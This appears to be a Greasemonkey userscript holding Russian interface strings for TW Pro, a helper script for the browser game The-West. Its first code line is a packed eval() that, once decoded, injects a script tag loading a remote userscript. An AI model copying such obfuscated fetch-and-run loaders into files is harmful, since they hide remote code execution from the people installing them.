// ==UserScript==
// @name            Language pack - Russian Pro + Last Update
// @description     Library for The-West - TW Pro+ [SOM] (http://userscripts.org/scripts/show/92414)
// @translator(s)   Nicholas Slepchenko
// @version         3.1.0.0
// @exclude         *
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


twpro_lp_custom = {
	info: ['Nicholas Slepchenko', 'mailto:slepchenko.nicholas@gmail.com', 604558, '.ru1.ru7.ru8.ru9.'],     /*['Your name', 'http://your_url OR mailto:your_email', char_id (the character_id can be seen in your browser status bar by pointing your name on the ranking pages), '.fr1.w1.en12.de3. (the subdomain(s) of the world(s) you play. Each subdomain must be always preceded AND followed by a dot)']. Email/url and char_id+worlds are optional. If you mention your emanil/url address, other players will be able to see it on worlds you don't play. If you mention your char_id & world subdomains, other players will be able to open your InGame profile on worlds you play. Just leave these parameters blank if you don't want to use them.*/
		AUTHOR: 'Авторы',     /*Displayed in footer, below the game chat. Prepended the list of authors of TW Pro*/
		TRANSLATOR: 'Перевод',     /*Displayed in footer. Prepended the translator of the current game locale*/
		TWPRO_DISABLED: 'Скрипт выключен: скрипт нуждается в обновлении из-за изменений в THE-WEST',     /*The script can be disabled due to source code changes by The-West devs. If disabled, this text is displayed in the footer*/
		SORTBYNAME: 'Сортировать по <b>имени</b>',     /*"Order activity list by name" button at the Inventory*/
		SORTBYXP: 'Сортировать по <b>опыту</b>',     /*"Order activity list by experience" button at the Inventory*/
		SORTBYWAGES: 'Сортировать по <b>заработку</b>',     /*"Order activity list by wages" button at the Inventory*/
		SORTBYLUCK: 'Сортировать по <b>удаче</b>',     /*"Order activity list by luck" button at the Inventory*/
		SORTBYCOMB: 'Сортировать по <b>рейтингу работы</b>',     /*"Order activity list by job rank" button at the Inventory. The player can define the importance of experience, wages, luck and danger, which is called "Job rank"*/
		SORTBYDANGER: 'Сортировать по <b>опастности</b>',     /*"Order activity list by danger" button at the Inventory*/
		SORTBYLABORP: 'Сортировать по <b>трудовым очкам</b>',     /*"Order activity list by labor points" button at the Inventory*/
		FILTERJOBS: 'Скрыть недоступные работы',     /*This message is shown in a tooltip when hovering over a checkbox which is available in the "Hide activities and itemsets" window. This checkbox is used to toggle the setting for hiding activities which the player cannot do (labor points is negative)*/
		FILTERCLOTHING: 'Отображать наиболее подходящую одежду для выбранной деятельности',     /*This text is shown in a tooltip when hovering over a checkbox at the Inventory. If checked, the best items for the selected activity is shown with all other items hidden*/
		CHOOSEJOB: 'Выберите деятельность',     /*If TW Pro has calculated the activity list, this text is shown when no activity is selected*/
		CALCJOB: 'Вычесление ТО...',     /*If TW Pro is calculating the activity list, this text will be shown in the activity list drop-down box*/
		INVENTSTATS: 'Статистика инвентаря',     /*The title of the tooltip, visible when hovering over the "Backpack" text at the Inventory*/
		SELLVALUE: 'Цена всего инвентаря',     /*Visible in the Inventory statistics tooltip. The money you get for selling all items*/
		OBJECTS: 'Предметы',     /*Visible in the Inventory statistics tooltip. Objects are all items except for products*/
		PRODUCTS: 'Продукты',     /*Visible in the Inventory statistics tooltip. */
		TOTAL: 'Общее',     /*Visible in the Inventory statistics tooltip. */
		QUANTITIES: 'Количество',     /*Visible in the Inventory statistics tooltip. */
		LABORP: 'ТО',     /*Abbrevation of Labor points, please keep this as short as possible; it is used in the activity ;ost and other places*/
		CONSTRUCTION: ' \u25B7 Постройка',     /*A special activity, constructing buildings in your town*/
		HPTOTAL: '\u25B7 Максимально количество ХП',     /*This text is used in an exported duel report. It indicates the sum of lost health points in a duel*/
		STARTCALC: 'Подсчёт данных...',     /*If TW Pro has not calculated the activity list yet, this text will be shown in the activity list drop-down box*/
		CONVERT: 'Конвертация',     /*A button in a duel report, used for exporting a duel to BBcodes*/
		MULTISEL: 'Продать дублирующиеся предметы',     /*A button in a town trader, enabling players to sell multiple items at once*/
		SELL: 'Продать выделенное',     /*The value of the button after clicking the "Sell multiple items..." button. Clicking this button sells all selected items*/
		CONFIRMSELL: 'Действительно ли вы хотите продать %1 вещей?',     /*Text of a confirmation dialogue, shown after clicking "Sell selection"*/
		SELLING: 'Продажа...',     /*The value of the button "Sell selection" during a multi-sale*/
		SALEDONE: 'Выделенные предметы проданы.',     /*This text is displayed after a multi-sale*/
		NONESELECTED: 'Вы должны выбрать хотя бы один предмет!',     /*This warning message is displayed when no items are selected when trying to sell multiple items*/
		JOBRANKSETTINGS: 'Сортировка деятельности',     /*This text is shown in a tooltip on hovering over the image for a job rank.  The player can define the importance of experience, wages, luck and danger, which is called "Job rank"*/
		SEARCHINVENTORY: 'Поиск инвентаря',     /*This text is displayed in the "Search inventory" text field by default. Keep it short*/
		NOSEARCHRESULT: 'Ваш поиск для %1 завершился неудачей.%2Отобразить все предметы%3',     /*This message is displayed in the inventory (Inventory and Market) when the search query returned no items. %1 is the query, %2 marks the beginning of the "Display all items" link, %3 marks the end. Clicking "Display all items" removed the search filter (empties the "Search inventory" text field)*/
		DISABLEBESTFORJOB: 'Отключить скрытие предметов, менее подходящих для этой деятельности.',     /*This text is displayed when the checkbox "Just display the best clothing available for the selected activity" is checked and the inventory search returned no results*/
		SEARCHHELP: 'Search the inventory. You can use wildcards (* for zero or more characters, ? for one character)',     /*When hovering over the "?" button next to the "Search inventory" field, this help message is displayed in a tooltip*/
		DUELSHOOTINGATT: ' \u25B7 Стрелок (атака)',     /*A special activity for duel clothing used by shooting duellers in the challenging role*/
		DUELSHOOTINGDEF: ' \u25B7 Стрелок (защита)',     /*A special activity for duel clothing used by shooting duellers in the defending role*/
		DUELVIGOR: ' \u25B7 Рукопашка',     /*A special activity for duel clothing used by resistance duellers*/
		FORTATTACK: ' \u25B7 Форт (атака)',     /*A special activity for attackers in fort battles*/
		FORTDEFEND: ' \u25B7 Форт (защита)',     /*A special activity for defenders in fort battles*/
		FORTMESSAGE: 'Сообщение участникам',     /*Displayed on Fortbattle page, to send a PM to all participants*/
		FORTMESSAGERCP: 'Число получателей',     /*Information displayed when you click on "Message to participants"*/
		HIDEJOBS: 'Менеджер деятельности',     /*This text is shown as a tab in the TW Pro settings window*/
		CONFIRM: 'Подтвердить',     /*The button for confirming/ saving changes in the "Activities & Itemsets Management" tab*/
		HIDEJOBDESC: 'Любая деятельность может быть отключена здесь. Отметьте все деятельности, которые не должны рассчитыватся автоматически, и нажмите кнопку "Подтвердить".',     /*The description for the "Activities & Itemsets Management" tab*/
		SHOWN: 'Включено',     /*Displayed ahead the selection field for activities that are currently enabled*/
		HIDDEN: 'Отключено',     /*Displayed ahead the selection field for activities that are currently disabled*/
		NOEQUIP: "Без снаряжения",     /*Visible in the "Activities & Itemsets Management" tab. Popup displayed in the activities list.*/
		BESTEQUIP: "С вашим лучшим снаряжением",     /*Visible in the "Activities & Itemsets Management" tab. Popup displayed in the activities list.*/
		SETTINGSSAVED: 'Настройки для TW Pro были сохранены!',     /*After clicking "Confirm" in the "Activities & Itemsets Management" tab, this message is displayed*/
		SETTINGSSAVEDSESSION: 'Настройки для TW Pro были сохранены! (только для этой сессии)',     /*After clicking "Confirm" in the "Activities & Itemsets Management" tab while having the checkbox near Confirm checked (persistent settings), this message is displayed*/
		PERSISTSETTINGS: 'Сохранить эти настройки для каждой сессии.',     /*Displayed in a tooltip when hovering over a checkbox next to "Confirm" in the "Activities & Itemsets Management" tab. If this checkbox is checked, the changes will be saved for future sessions. Otherwise, after a reloading the page, changes are lost*/
		CANNOTWEAR: 'Вы не можете надеть этот набор, или этот набор или этот набор не повлияет на расчёт ТО.',     /*This text is displayed when hovering over an item set at the "Activities & Itemsets Management" tab for items sets you cannot wear (e.g. Dancer set cannot be used by male characters) or that have no influence on Activities (e.g.: Sleepyhead has only bonuses in "Fastest Lifepoints")*/
		SETSETTINGS: 'Отключить наборы для более быстрого расчета. Наборы со специальными, неудовлетворяющими требованиям по умолчанию отключены.',     /*The description displayed ahead the settings for itemsets at the "Activities & Itemsets Management" tab*/
		CUSTOMNAME: 'Введите нужное имя для деятельности',     /*Visible in the "Activities & Itemsets Management" tab.This message is displayed in a tooltip when hovering over the text field, used for setting the name for a custom activity.*/
		CUSTOMCALCULATION: 'Введите правильный TW Pro расчёт здесь.',     /*This message is displayed in a tooltip when hovering over the text field, used for setting the TW Pro calculation (this calculation is used for determining the importance of skills for activities) for a custom activity. Applies to the "Activities & Itemsets Management" tab*/
		CUSTOMENABLED: 'Поставьте галочку для влючения этой деятельности',     /*This button is visible in the "Activities & Itemsets Management" tab. If this checkbox is checked, the activity is included in the activity list. Otherwise, the activity will be hidden*/
		NEW: '\u25B7 Новая',     /*Visible in the "Activities & Itemsets Management" tab.This text is displayed in a tooltip when hovering over the "+" button, used for creating a new custom activity*/
		SPEED: ' \u25B7 Скорость',     /*A special activity, useful for travelling great distances and saving time*/
		REGENERATION: ' \u25B7 Быстрое восстановление ХП',     /*A special activity, useful when you are low on Health points and want to restore your health points faster*/
		SETSINFO: "Наборы",     /*Title of the "Itemsets information" window which displays the bonuses for each set*/
		WITHSETITEMS: 'Бонус с %1 предметами',     /*Displayed in Setinfo window*/
		LABORPOINTS: 'Трудовые очки',     /*Labor points, displayed for sets. Example: +20 Labor points*/
		USEFULITEM: 'Это число указывает на количество предметов, которые используются в расчетах',     /*Displayed between parentheses after a set name in the TW Pro Config screen*/
		PERCREGENERATION: 'Регенерация',     /*__ % Regeneration with Sleepyhead items*/
		LUCK: 'удача',     /*__ % luck with Holiday set items*/
		PRAYING: 'молитва',     /*6 Sleepyhead items gives +1 Praying*/
		NOITEMSETS: "У вас нет ни одного предмета из этого набора",     /*Displayed in the vertical Set filters*/
		AVERAGEDAMAGE: "Средняя атака",     /*Displayed on every weapons*/
		PREFERENCES: "Настройки",     /*This text is shown as a tab in the TW Pro settings window*/
		DEFAULTSORTING: " \u25B7 Сортировка по умолчанию",     /*Visible in the "Preferences" tab.*/
		FBHEALTHPRIORITY: "Приоритет ХП",     /*Visible in the "Preferences" tab.*/
		FBHEALTHPRIORITYZERO: "Ничего",     /*Visible in the "Preferences" tab. Applies to the "Health points priority" menu.*/
		FBHEALTHPRIORITYLOW: "Низкий",     /*Visible in the "Preferences" tab. Applies to the "Health points priority" menu.*/
		FBHEALTHPRIORITYMEDIUM: "Средний",     /*Visible in the "Preferences" tab. Applies to the "Health points priority" menu.*/
		FBHEALTHPRIORITYHIGH: "Высокий",     /*Visible in the "Preferences" tab. Applies to the "Health points priority" menu.*/
		FBHEALTHPRIORITYAUTO: "Авто",     /*Visible in the "Preferences" tab. Applies to the "Health points priority" menu.*/
		FBBATTLEUNIT: "Ваше поведение на форте",     /*Visible in the "Preferences" tab.*/
		FBBATTLEUNITSKIRMISHER: "Передовик - храбрец",     /*Visible in the "Preferences" tab. Applies to the "Battle unit type" menu.*/
		FBBATTLEUNITLINEINFANTRYMAN: "Средняя линия",     /*Visible in the "Preferences" tab. Applies to the "Battle unit type" menu.*/
		FBBATTLEUNITMARKSMAN: "Снайперы - тыловики",     /*Visible in the "Preferences" tab. Applies to the "Battle unit type" menu.*/
		DMGMIN: "Мин",     /*Abbreviation for Minimum. Refers to the minimum damage of a weapon. Visible on weapon popups.*/
		DMGMAX: "Макс",     /*Abbreviation for Maximum. Refers to the maximum damage of a weapon. Visible on weapon popups.*/
		DMGAVG: "Ср",     /*Abbreviation for Average. Refers to the average damage of a weapon. Visible on weapon popups.*/
		CHATWHISPER: "* Шепнуть *\n\nВведите имя игрока",     /*Visible when clicking the corresponding button in the Chat box.*/
		CHATCOLOR: "* Ваш цвет (000-999) *\n\nВведите номер цвета",     /*Visible when clicking the corresponding button in the Chat box.*/
		USEFULITEMS : "Выберите необходимые требования",     /*Visible near the backpack. Displayed when calculations has been run and none activity is selected.*/
		USEFULITEMSPOPUP : " \u25B7 Рюкзак | Полезность предмета",     /*Visible in the "Preferences" tab. Applies to the special box that highlights useful items.*/
		USEFULITEMSPOPUPDESC : "Бонусые ТО будут отображатся на каждом предмете.",     /*Popup visible in the "Preferences" tab. Applies to the special box that highlights useful items.*/
		SHOWALLJOBS : " \u25B7 Отобразить все работы",     /*Visible in the "Preferences" tab.*/
		SHOWALLJOBSDESC : "Будет активно после обновления страницы (F5)",     /*Popup visible in the "Preferences" tab.*/
		COLLECTORMODE : " \u25B7 Режим коллекционера",     /*Visible in the "Preferences" tab.*/
		COLLECTORMODEDESC : "При отсутствии предмета из магазина в вашем инвентаре он будет подсвечиватся синим",     /*Popup visible in the "Preferences" tab.*/
		HELP : "Справка",     /*Visible in the "Preferences" tab.*/
		WEBSTORAGEQUOTAEXCEEDED : "Квота веб хранилища повышенна! Quota exceeded!\n\n- Ваши текущие данные не будут полными.\n- КЕШ функция будет отключена автоматически.\n- Пожалуйста, очистите КЕШ, или увеличьте квоту локального хранилища (возможно только в Firefox и Opera).",     /*Alert box displayed when WebStorage is full.*/
		CACHEGENERATE : "Генерация КЕШа...",     /*Visible in the inventory dropdown menu and in the prompt box for generating cache.*/
		CACHEUPDATE : "Обновление КЕШа",     /*Visible in the prompt box for updating cache.*/
		CACHEFORCEOK : "Обнаружена отмена изменений.",    /*Visible in the prompt box for generating cache when items changes are detected.*/
		CACHEFORCEOKDESC : "Force cache status to OK, without doing the calculations.",    /*Popup visible in the prompt box for generating cache when items changes are detected.*/
		CACHEGENERATENOW : "Вы хотите сгенерировать ваш КЕШ сейчас?",     /*Visible in the prompt box for generating cache.*/
		CACHEUPDATENOW : "Вы хотите обновить ваш КЕШ сейчас?",     /*Visible in the prompt box for updating cache.*/
		CACHEINVENTORYCHANGES : "Обнаружены изменения инвентаря.",     /*Popup visible on the inventory cache button.*/
		CACHEUPDATECLICK : "Нажмите для обновления КЕШа.",     /*Popup visible on the inventory cache button when items or skills changes are detected or when a new job is added in the game.*/
		CACHENEWITEMS : "Новый инвентарь",     /*Popup visible on the inventory cache button when items changes are detected.*/
		CACHEDELETEDITEMS : "Удаление инвентаря",     /*Popup visible on the inventory cache button when items changes are detected.*/
		CACHESKILLSCHANGES : "Обнаруженно изменения навыков.",     /*Popup visible on the inventory cache button when skills changes are detected.*/
		CACHEJOBSAFFECTED : "Activities affected",     /*Popup visible on the inventory cache button when skills changes are detected.*/
		CACHEISEMPTY : "КЕШ пустой.",     /*Popup visible on the inventory cache button.*/
		CACHEINITIALIZE : "Кликните сюда для инициализации.",     /*Popup visible on the inventory cache button when cache is empty.*/
		CACHEOK : "КЕШ OK.",     /*Popup visible on the inventory cache button.*/
		CACHEREWRITE : "Если нужно, вы всё ещё можете переписать данные здесь.",     /*Popup visible on the inventory cache button when cache is ok.*/
		CACHEEMPTYING : "КЕШ очищается",     /*Popup visible on the inventory cache button.*/
		CACHENORMALMODE : "TW Pro в нормальном режиме",     /*Popup visible on the inventory cache button when cache is emptying.*/
		CACHEDISABLED : "КЕШ отключен.",     /*Popup visible on the inventory cache button.*/
		CACHEOPENSETTINGS : "Откройте TW Pro настройки чтобы включить.",     /*Popup visible on the inventory cache button when cache is disabled.*/
		CACHENEWJOBSDETECTED : "Обнаруженна новая работа",     /*Popup visible on the inventory cache button when a new job is added in the game.*/
		CACHENEWJOBDETECTED : "Обнаруженна новая работа: %1<br>Пожалуйста, обновите КЕШ.",     /*Red box message displayed when a new job is added in the game.*/
		CACHEENABLE : " \u25B7 Включить TW Pro КЕШ",     /*Visible in the "Preferences" tab.*/
		CACHEINDEXEDDBNOT : "Индексы БД не поддерживаются вашим браузером.",     /*Alert box displayed when IndexedDB is selected but not supported.*/
		CACHEINDEXEDDBDESC : "Высокое быстродействие. Рекомендуется для Firefox 4+ и Chrome 11+.",     /*Visible in the "Preferences" tab.*/
		CACHECOMPATIBILITY : "Совместимость информации",     /*Visible in the "Preferences" tab.*/
		CACHEQUOTAS : "Квота информации",     /*Visible in the "Preferences" tab.*/
		CACHEQUOTASDESC : "<b>Нажмите на 'Квота информации' чтобы узнать лимит веб хранилища вашего браузера (LocalStorage).<br>"
				  +"<br>Как увеличить LocalStorage лимит?</b><br>"
				  +"<b>- Firefox:</b><br>"
				  +"Наберите 'about:config' в адрессной строке вашего браузера и найдите опции для <br>"
				  +"'dom.storage.default_quota'. Это значение в килобайтах, вы можете изменить его. <br>"
				  +"Место хранилища доступно для языкового сервера, вам нужно будет 1500 кБ на аккаунт <br>"
				  +"одного и тогоже сервера."
				  +"<b>- Chrome:</b><br>"
				  +"Невозможно регулировать квоту.<br>"
				  +"<b>- Opera:</b><br>"
				  +"По умолчанию, ваш браузер предложит вам увеличить квоту когда это потребуется. Однако <br>"
				  +"вы можете набрать 'opera:webstorage' в адрессной строке и изменить и для каждого домена.<br>"
				  +"Значение в килобайтах. Хранилище расшаренно миру (субдомену), вам понадобится 3000 кБ<br>"
				  +"на каждый аккаунт одного и того же мира.<br>"
				  +"<b>- Safari:</b><br>"
				  +"Невозможно регулировать квоту.",     /*Popup visible in the "Preferences" tab when hovering the "quotas info" link.*/
		CACHEEMPTY : "КЕШ TW Pro отсутствует.",     /*Popup visible in the "Preferences" tab.*/
		CACHEEMPTYDESC : "Восстанавливающий инструмент. Использовать в случае несоответствия данных",     /*Popup visible in the "Preferences" tab.*/
		CACHEWEBSTORAGEDESC : "Высокое быстродействие. Поддерживается большинством современных браузеров, но могут быть пределы квоты хранения.",     /*Visible in the "Preferences" tab.*/
		CACHEEMPTYNOW : "Вы хотите очистить КЕШ сейчас?",     /*Visible in the prompt box displayed when user wants to delete the cache.*/
		CACHERECORDS : "записи",     /*Visible in the prompt box displayed when user wants to delete the cache.*/
		CACHEEMPTIED : "Очистка КЕШ памяти!",     /*Message displayed when user has deleted the cache.*/
		CACHERECORDSDELETED : "запись удалена.",     /*Message displayed when user has deleted the cache.*/
		CACHEEMPTYSLOWDESC : "Вы все еще можете играть во время процесса.",     /*Popup visible in the prompt box displayed when user wants to delete the Webstorage cache. Also visible as popup on the Safemode checkbox, in the "Preferences" tab.*/
		CACHEEMPTYFASTDESC : "Быстрее но браузер может зависнуть в процессе.",     /*Popup visible in the prompt box displayed when user wants to delete the Webstorage cache.*/
		CACHEFASTMODE : "Быстрый режим",     /*Visible in the prompt box displayed when user wants to delete the Webstorage cache.*/
		NORMALMODE : "Нормальный режим",     /*Visible in the prompt box displayed when user wants to delete the Webstorage cache. Also visible in the "Preferences" tab for the "Split fortbattle combinations" feature*/
		FBCOMBOFAVORITE : "Рекомендуемый",     /*Displayed in the inventory dropdown menu when the "Split fortbattle combinations" feature is enabled AND in Submenu mode.*/
		FBCOMBOGENERATE : "Сгенерировать все фортовые комбинации",     /*Visible in the "Preferences" tab.*/
		FBCOMBODESC : "Это добавит 30 действий в ваше выпадающее меню, но потом вам нужно будет отредактировать их в меню",     /*Visible in the "Preferences" tab.*/
		FBCOMBONORMALDESC : "Отображать комбинации как нормальные действия в выпадающем меню.",     /*Visible in the "Preferences" tab.*/
		FBCOMBOSUBMENUS : "Субменю мод",     /*Visible in the "Preferences" tab.*/
		FBCOMBOHELPDESC : "<b>Когда ваг выпадающий список выделен:</b><br>- Нажмите [1] чтобы разложить атакующие комбинации в субменю.<br>- Нажмите [2] чтобы разложить защитные комбинации в субменю.<br>- Нажмите [Space] чтобы раз.",     /*Popup visible in the "Preferences" tab when hovering the "HELP" link.*/
		FBCOMBOSUBMENUSDESC : "Отображать комбинации как субменю главных фортовых действий.",     /*Visible in the "Preferences" tab.*/
		FBCOMBOMOZTIP : "Пользователи FireFox также имеют возможность правой кнопкой мыши получить фортовые действия <br>в выпадающем меню расширить соответствующие подменю.",     /*Popup visible in the "Preferences" tab when hovering the "HELP" link.*/
		SAFEMODE : " \u25B7 Включить безопастный режим",     /*Visible in the "Preferences" tab.*/
		SAFEMODEDESC : "Более медленные вычисления но избавляет ваш браузер от подвисания.",     /*Popup visible in the "Preferences" tab.*/
		SAFEMODEFBEXCL : "Не запускать в безопасном режиме при использовании ручных настроек фортов выше.",     /*Popup visible in the "Preferences" tab.*/
		SAFEMODERUNNING : "Безопасный режим запущен...",     /*Displayed during the calculation in safe mode. Also visible in a prompt box when Safemode calculation is running and when user try to refresh/open/close the inventory.*/
		SAFEMODERUNNINGDESC : ["В процессе:", "- Не закрывайте и не обновляйте ваш инвентарь", "- Не покупайте и не продавайте инвентарь.", "- Не одевайте и не снимайте вещи.", "- Не меняйте ваши навыки.", "Хорошо, я буду окуратным. Теперь дайте взглянуть на мой инвентарь..."],     /*Displayed during the calculation in safe mode.*/
		SAFEMODECOMPLETED : "Безопастный режим включён!",     /*Green box message displayed at the end of the Safe mode process. Also visible in the blinking browser tab.*/
		ACTIVITIES : "Деятельность",     /*Popup visible in the stats, at the top-left of the Inventory window, when calculations are done.*/
		ITEMS : "Предметы",     /*Popup visible in the stats, at the top-left of the Inventory window, when calculations are done.*/
		ITEMSETSCOMBI : "Комбинации предметов",     /*Popup visible in the stats, at the top-left of the Inventory window, when calculations are done.*/
		TESTSRUN : "Количество тестов.",     /*Popup visible in the stats, at the top-left of the Inventory window, when calculations are done.*/
		CALCTIME : "Время вычесления",     /*Popup visible in the stats, at the top-left of the Inventory window, when calculations are done.*/
		NOJOBSAFFECTED : "Изменения не затрнуть какую-либо текущиу деятельность.",     /*Popup visible in the stats, at the top-left of the Inventory window, when calculations are done with 0 job modified.*/
		AREYOUSURE : "Вы действительно хотите это сделать?",     /*Visible in a prompt box when Safemode calculation is running and when user try to refresh/open/close the inventory.*/
};